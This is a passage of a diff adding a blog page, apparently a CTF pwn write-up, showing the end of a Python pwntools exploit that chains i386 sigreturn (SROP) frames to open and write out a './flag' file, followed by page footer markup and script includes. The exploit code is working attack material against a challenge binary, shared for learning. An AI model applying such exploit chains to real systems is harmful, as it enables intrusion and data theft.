+</span></span><span style="display:flex;"><span>frame2<span style="color:#f92672">.</span>esp <span style="color:#f92672">=</span> stack_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>frame2<span style="color:#f92672">.</span>cs <span style="color:#f92672">=</span> <span style="color:#ae81ff">35</span>
+</span></span><span style="display:flex;"><span>frame2<span style="color:#f92672">.</span>ss <span style="color:#f92672">=</span> <span style="color:#ae81ff">43</span>
+</span></span><span style="display:flex;"><span>frame2<span style="color:#f92672">.</span>ds <span style="color:#f92672">=</span> <span style="color:#ae81ff">43</span>
+</span></span><span style="display:flex;"><span>frame2<span style="color:#f92672">.</span>es <span style="color:#f92672">=</span> <span style="color:#ae81ff">43</span>
+</span></span><span style="display:flex;"><span>frame2<span style="color:#f92672">.</span>fs <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>frame2<span style="color:#f92672">.</span>gs <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>frame3 <span style="color:#f92672">=</span> SigreturnFrame(kernel<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;i386&#39;</span>)
+</span></span><span style="display:flex;"><span>frame3<span style="color:#f92672">.</span>eax <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span> <span style="color:#75715e"># write</span>
+</span></span><span style="display:flex;"><span>frame3<span style="color:#f92672">.</span>ebx <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>frame3<span style="color:#f92672">.</span>ecx <span style="color:#f92672">=</span> stack_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x200</span>
+</span></span><span style="display:flex;"><span>frame3<span style="color:#f92672">.</span>edx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>
+</span></span><span style="display:flex;"><span>frame3<span style="color:#f92672">.</span>eip <span style="color:#f92672">=</span> int_0x80
+</span></span><span style="display:flex;"><span>frame3<span style="color:#f92672">.</span>esp <span style="color:#f92672">=</span> stack_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>frame3<span style="color:#f92672">.</span>cs <span style="color:#f92672">=</span> <span style="color:#ae81ff">35</span>
+</span></span><span style="display:flex;"><span>frame3<span style="color:#f92672">.</span>ss <span style="color:#f92672">=</span> <span style="color:#ae81ff">43</span>
+</span></span><span style="display:flex;"><span>frame3<span style="color:#f92672">.</span>ds <span style="color:#f92672">=</span> <span style="color:#ae81ff">43</span>
+</span></span><span style="display:flex;"><span>frame3<span style="color:#f92672">.</span>es <span style="color:#f92672">=</span> <span style="color:#ae81ff">43</span>
+</span></span><span style="display:flex;"><span>frame3<span style="color:#f92672">.</span>fs <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>frame3<span style="color:#f92672">.</span>gs <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;./flag</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span>) <span style="color:#f92672">+</span> p32(sigreturn_addr) <span style="color:#f92672">+</span> bytes(frame)
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaaa&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;bbbb&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cccc&#34;</span>
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">+=</span> p32(sigreturn_addr) <span style="color:#f92672">+</span> bytes(frame2)
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaaa&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;bbbb&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cccc&#34;</span>
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">+=</span> p32(sigreturn_addr) <span style="color:#f92672">+</span> bytes(frame3)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload1)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+            <div class="post-tags">
+              <a href="/tags/pwn/">
+                Pwn
+              </a>
+            </div>
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+<div class="related-content">
+  <h3>Related Posts</h3>
+  <ul>
+    
+    <li><a href="/posts/t1d_foolctf-2024-writeups/">foolctf 2024 WriteUp 和一些关于 shellcode 的反思</a></li>
+    
+    <li><a href="/posts/unbreakablectf2024-writeup/">Unbreakable CTF 2024题解及反思</a></li>
+    
+    <li><a href="/posts/moectf-2023-pwn-writeup/">MoeCTF 2023 Pwn 题目复现</a></li>
+    
+  </ul>
+</div>
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
+
+        
+
+<link rel="shortcut icon" href="favicon.ico" />
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+            delimiters: [
+                {left: "$$", right: "$$", display: true},
+                {left: "$", right: "$", display: false}
+            ]
+        });
+    });
+</script>
+
+
+
+
+<link rel="stylesheet"
+  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/x86asm.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+document.addEventListener('DOMContentLoaded', (event) => {
+  document.querySelectorAll('pre code').forEach((el) => {
+    hljs.highlightElement(el);
+  });
+});
+</script>
+
+
+
+
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
